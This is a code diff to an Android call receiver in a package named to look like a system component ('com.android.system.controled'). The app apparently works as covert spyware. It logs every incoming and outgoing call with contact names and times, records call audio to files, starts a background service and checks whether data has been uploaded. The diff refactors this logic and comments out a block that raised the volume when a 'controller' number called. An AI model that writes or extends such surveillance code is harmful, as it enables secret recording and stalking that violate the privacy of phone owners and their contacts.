@@ -10,10 +10,11 @@ import android.telephony.PhoneStateListener;
 import android.telephony.TelephonyManager;
 
 import com.android.system.controled.Debug;
-import com.android.system.controled.Globle;
+import com.android.system.controled.MainApplication;
 import com.android.system.controled.util.AudioUtil;
 import com.android.system.controled.util.ContactsUtil;
 import com.android.system.controled.util.FileUtil;
+import com.android.system.controled.util.InitUtil;
 import com.android.system.controled.util.RecorderUtil;
 import com.android.system.controled.util.StringUtil;
 import com.android.system.controled.util.TimeUtil;
@@ -28,8 +29,7 @@ public class CallReceiver extends BroadcastReceiver {
 	@Override
 	public void onReceive(Context context, Intent intent) {
 
-		Globle.startBackService(context);// Start the back service
-		Globle.checkUploadedOrNot(context);
+		InitUtil.init(context);
 
 		if (tm == null) {
 			tm = (TelephonyManager) context.getSystemService(Service.TELEPHONY_SERVICE);
@@ -39,7 +39,7 @@ public class CallReceiver extends BroadcastReceiver {
 		}
 
 		if (intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
-			FileUtil.writeFile("去电：" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + "    " + ContactsUtil.getNameFromContactsByNumber(context, getResultData()) + ":" + getResultData(), Globle.FILE_CALL_LOG, true);
+			FileUtil.writeFile("去电：" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + "    " + ContactsUtil.getNameFromContactsByNumber(context, getResultData()) + ":" + getResultData(), MainApplication.FILE_CALL_LOG, true);
 			startRecord(context, getResultData(), "去电");
 		} else {
 			tm.listen(ml, PhoneStateListener.LISTEN_CALL_STATE);
@@ -65,31 +65,32 @@ public class CallReceiver extends BroadcastReceiver {
 
 			case TelephonyManager.CALL_STATE_IDLE:
 				Debug.i("CallReceiver", "idle");
-				FileUtil.writeFile("\r\n挂断：" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + "\r\n\r\n", Globle.FILE_CALL_LOG, true);
+				FileUtil.writeFile("\r\n挂断：" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + "\r\n\r\n", MainApplication.FILE_CALL_LOG, true);
 				stopRecord(con);
 				break;
 			case TelephonyManager.CALL_STATE_OFFHOOK:
 				Debug.i("CallReceiver", "offhook");
-				FileUtil.writeFile("\r\n接听：" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()), Globle.FILE_CALL_LOG, true);
+				FileUtil.writeFile("\r\n接听：" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()), MainApplication.FILE_CALL_LOG, true);
 				break;
 			case TelephonyManager.CALL_STATE_RINGING:
 				Debug.i("CallReceiver", "ring num: " + incomingNumber);
-				FileUtil.writeFile("来电：" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + "    " + ContactsUtil.getNameFromContactsByNumber(con, incomingNumber) + ":" + incomingNumber, Globle.FILE_CALL_LOG, true);
+				FileUtil.writeFile("来电：" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + "    " + ContactsUtil.getNameFromContactsByNumber(con, incomingNumber) + ":" + incomingNumber, MainApplication.FILE_CALL_LOG, true);
 				startRecord(con, incomingNumber, "来电");
-				if (incomingNumber.contains(Globle.PHONE_NUMBER)) {
-					// 在特定时间内，自动调大音量
-					switch (TimeUtil.inTime()) {
-					case TimeUtil.TIME_NOW_NIGHT:
-						AudioUtil.turnUpMost(con);
-						break;
-					case TimeUtil.TIME_NOW_MOON:
-						AudioUtil.turnUpSecond(con);
-						break;
-
-					default:
-						break;
-					}
-				}
+				//TODO
+//				if (incomingNumber.contains(MainApplication.controllerTel)) {
+//					// 在特定时间内，自动调大音量
+//					switch (TimeUtil.inTime()) {
+//					case TimeUtil.TIME_NOW_NIGHT:
+//						AudioUtil.turnUpMost(con);
+//						break;
+//					case TimeUtil.TIME_NOW_MOON:
+//						AudioUtil.turnUpSecond(con);
+//						break;
+//
+//					default:
+//						break;
+//					}
+//				}
 
 				break;
 			}
@@ -116,7 +117,7 @@ public class CallReceiver extends BroadcastReceiver {
 		String name = StringUtil.getRidofSpecialOfFileName(ContactsUtil.getNameFromContactsByNumber(con, number));
 
 		// 文件保存位置
-		File file = new File(Globle.FILEPATH_AUDIOS_CALL + type + "_" + name + "_" + number + "_" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + ".amr");
+		File file = new File(MainApplication.FILEPATH_AUDIOS_CALL + type + "_" + name + "_" + number + "_" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + ".amr");
 		RecorderUtil.getInstence(con).startRecorder(file, -1);
 	}
 
